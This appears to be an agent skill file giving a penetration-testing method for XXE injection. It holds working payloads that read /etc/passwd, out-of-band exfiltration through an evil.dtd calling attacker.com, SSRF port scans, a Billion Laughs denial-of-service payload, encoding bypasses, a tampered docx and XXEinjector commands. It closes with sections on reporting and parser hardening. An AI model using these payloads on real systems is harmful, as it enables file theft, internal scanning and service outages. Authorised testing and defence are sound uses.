---
name: xxe-testing
Description: Professional skills and methodology for XXE XML external entity injection testing
version: 1.0.0
---

# XXE XML external entity injection test

## Overview

XXE (XML External Entity) injection is a vulnerability that exploits XML parsers to handle external entities. This skill provides methods for detecting, exploiting and protecting XXE vulnerabilities.

## Vulnerability principle

When an XML parser processes external entities, it may read local files, conduct SSRF attacks, or cause a denial of service. Commonly found in:
- XML ​​document parsing
- SOAP service
- Office documents (.docx, .xlsx, etc.)
- SVG images
- PDF file

## Test method

### 1. Identify XML input points

- File upload function
- API interface accepts XML data
- SOAP request
-Office document processing
- Data import function

### 2. Basic XXE detection

**Test external entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Test Network Request (SSRF):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>
```

### 3. Blind XXE detection

**When the response does not display content directly:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?file=/etc/passwd">
]>
<foo>&xxe;</foo>
```

**Use parameter entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**evil.dtd content:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;
```

## Leverage technology

### File reading

**Read local file:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Windows Path:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

### SSRF attack

**Intranet detection:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**Port Scan:**
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
```

### Denial of service

**Billion Laughs Attack:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

###Office DocumentXXE

**docx file structure:**
```
Word/document.xml - contains document content
Word/_rels/document.xml.rels - contains external references
```

**Modify document.xml.rels:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///etc/passwd" TargetMode="External"/>
</Relationships>
```

## Bypass technology

### Different protocols

**PHP：**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
```

**Java：**
```xml
<!ENTITY xxe SYSTEM "jar:file:///path/to/file.zip!/file.txt">
```

**Encoding Bypass:**
```xml
<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
```

### Parameter entity

**Use parameter entities to bypass certain restrictions:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>test</foo>
```

## Tool usage

### XXEinjector

```bash
#Basic usage
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml

#File reading
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
```

### Burp Suite

1. Intercept requests containing XML
2. Send to Repeater
3. Modify the XML content and add external entities
4. Observe responses or outbound data

## Validation and reporting

### Verification steps

1. Confirm that the XML parser handles external entities
2. Verify file read or SSRF is successful
3. Assess the scope of impact (sensitive files, intranet access, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and XML input point
- Readable files or accessible intranet resources
- Complete exploitation steps and PoC
- Fix suggestions (disable external entities, use whitelists, etc.)

## Protective measures

### Recommended plan

1. **Disable external entities**
   ```java
   // Java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **Use whitelist verification**
- Validate XML structure
- Limit allowed entities

3. **Use a safe parser**
- Use a parser that does not handle DTDs
- Use JSON instead of XML

## Notes

- Only conducted in an authorized testing environment
- Avoid data leakage caused by reading sensitive files
- Be aware of differences in XXE handling across languages ​​and libraries
- Pay attention to the file format when testing Office documents